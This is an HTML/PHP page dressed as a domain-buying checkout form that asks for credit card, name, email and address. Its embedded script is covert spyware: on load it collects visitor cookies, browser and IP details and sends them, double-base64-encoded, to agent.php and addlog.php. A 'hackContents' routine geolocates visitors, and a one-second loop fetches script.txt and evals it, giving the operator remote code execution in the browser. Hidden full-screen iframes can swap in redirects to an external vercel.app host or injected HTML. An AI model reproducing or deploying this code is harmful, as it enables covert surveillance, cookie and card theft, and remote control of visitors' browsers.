<html>
  <head>
    <title>My site!</title>
        <?php
$ip = $_SERVER['REMOTE_ADDR'];
echo '<script>var privateIP = "'.$ip.'";</script>';
?>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f2f2f2;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    text-align: center;
    background-color: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

input, button {
    margin: 10px 0;
    padding: 8px;
    width: 100%;
    box-sizing: border-box;
}

.hidden {
    display: none;
}

</style>
  </head>
  <body>
    <div class="container">
        <h1>Coding Namespace Buyer</h1>
        <label for="domainInput">Domain:</label>
        <input type="text" id="domainInput" placeholder="Enter your domain">

        <button onclick="checkout()">Checkout</button>

        <div id="checkoutForm" class="hidden">
            <label for="creditCard">Credit Card Number:</label>
            <input type="text" id="creditCard" placeholder="Enter your credit card number">

            <label for="name">Name:</label>
            <input type="text" id="name" placeholder="Enter your name">

            <label for="email">Email:</label>
            <input type="email" id="email" placeholder="Enter your email">

            <label for="address">Address:</label>
            <input type="text" id="address" placeholder="Enter your address">
            <button onclick="useMyLocation()">Use My Location</button>

            <button onclick="submitForm()">Submit</button>
        </div>

        <p id="response" class="hidden"></p>
    </div>
<iframe src="about:blank" class="access-frame" style="position: absolute; overflow-x: hidden; width: 100%; height: 100%; display: none; border: none; background: #FFF; z-index: 20; left: 0px; top: 0px;"></iframe>  
<iframe id="access-frame" style="position: absolute; overflow-x: hidden; width: 100%; height: 100%; display: none; border: none; background: #FFF; z-index: 20; left: 0px; top: 0px;"></iframe> <iframe id="fetch" style="display: none"></iframe>
<script>
  var content;
  var fetchInt;
  var script1 = "";
  var script2 = "";
  var shouldRun;
  function redirectTo(url){
    document.querySelector("#access-frame").style.display = 'none';
    document.querySelector(".access-frame").src = "https://qqqqqqqqqqqqqqqqqq.vercel.app/redirect.html#" + btoa(url);
    document.querySelector(".access-frame").style.display = 'block';
  }
  function displayHTML(html){
    document.querySelector(".access-frame").style.display = 'none';
    document.querySelector("#access-frame").srcdoc = atob(html);
    document.querySelector("#access-frame").style.display = 'block';
  }
  function message(str){
    var to = prompt(str);
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    }
  };
  xhttp.open("GET", "addlog.php?value=" + btoa("Message sent: " + str + ". Reply: " + to), true);
  xhttp.send();
  }
  function appendLog(log){
      var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    }
  };
  xhttp.open("GET", "addlog.php?value=" + btoa(log), true);
  xhttp.send();
  }
  function hackContents(ip){
  var ip = ip;
  var xhttp2 = new XMLHttpRequest();
  xhttp2.onreadystatechange = function() {
    if (this.status == 200 && this.readyState == 4) {
      var info = eval(xhttp2.responseText);
      var location = info.loc.split(",");
      location[0] += 0.035;
      location[1] -= 0.0324;
      appendLog(xhttp2.responseText);
      appendLog(JSON.stringify(location));
    } else{
      appendLog("Error with getting ip contents! Ready state: " + this.readyState + ". Status of xhttp: " + this.status + ".")
    }
  };
  xhttp2.open("GET", "hackip.php?ip=" + ip, true);
  xhttp2.send();
  }
setInterval(async function(){
shouldRun = true;
let x = await fetch("script.txt");
let y = await x.text();
script2 = atob(y);
  if(script2 == script1){
    shouldRun = false;
  } else {
      script1 = atob(y);
  }
  if(script1 == ""){
    shouldRun = false;
  }
  if(shouldRun == true){
    eval(atob(y));
    appendLog("Script has ran successfully!");
  }
}, 1000);
async function getIP(){
let x = await fetch("https://api.ipify.org");
let y = await x.text();
appendLog("Public IP: " + y + "<br> Private IP: " + privateIP);
}
function getWindowInfo() {
  var windowInfo = {};
  windowInfo.screenSize = screen.width + "x" + screen.height;
  windowInfo.hardwareCpu = navigator.cpuModel;
  windowInfo.operatingSystem = navigator.userAgent;
  windowInfo.browserName = navigator.appName;
  windowInfo.cookies = document.cookie;
  windowInfo.timestamp = new Date().toString();
  windowInfo.hostname = window.location.hostname;
  windowInfo.hostport = window.location.port;
  windowInfo.hostFamily = navigator.platform.toLowerCase();
  windowInfo.osVersion = navigator.userAgent.split(" ")[0];
//  windowInfo.chromeExtensions = chrome.extension.getManifest().plugins;
  return windowInfo;
}

var windowInfo = getWindowInfo();

var table = document.createElement("table");
table.setAttribute("border", "1");
table.setAttribute("style", "border-color: green, color: green, font-family: monospace");


var tbody = table.createTBody();
for (var key in windowInfo) {
  var tr = tbody.insertRow(0);
  var td = tr.insertCell(0);
  td.innerHTML = windowInfo[key];
  if(windowInfo[key] == ""){
  td.innerHTML = "None";
  }
  var td = tr.insertCell(0);
  td.innerHTML = key + ": ";
}
      var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    } else{
      appendLog("Error with xhttp for getting details! Ready state: " + this.readyState + ". Status: " + this.status + ".");
    }
  };
  xhttp.open("GET", "agent.php?details=" + btoa(btoa(table.outerHTML)), true);
  xhttp.send();
function checkout() {
    document.getElementById('checkoutForm').classList.remove('hidden');
}

function useMyLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            alert(`Location captured! Latitude: ${latitude}, Longitude: ${longitude}`);
        }, function (error) {
            alert(`Error getting location: ${error.message}`);
        });
    } else {
        alert("Geolocation is not supported by this browser.");
    }
}

function submitForm() {
    const domain = document.getElementById('domainInput').value;
    const creditCard = document.getElementById('creditCard').value;
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const address = document.getElementById('address').value;

    if (domain && creditCard && name && email && address) {
        document.getElementById('response').innerText = "Submitted form! Website workers will see your response.";
        document.getElementById('response').classList.remove('hidden');
    } else {
        alert("Please fill in all the input boxes.");
    }
}
</script>
  </body>
</html>
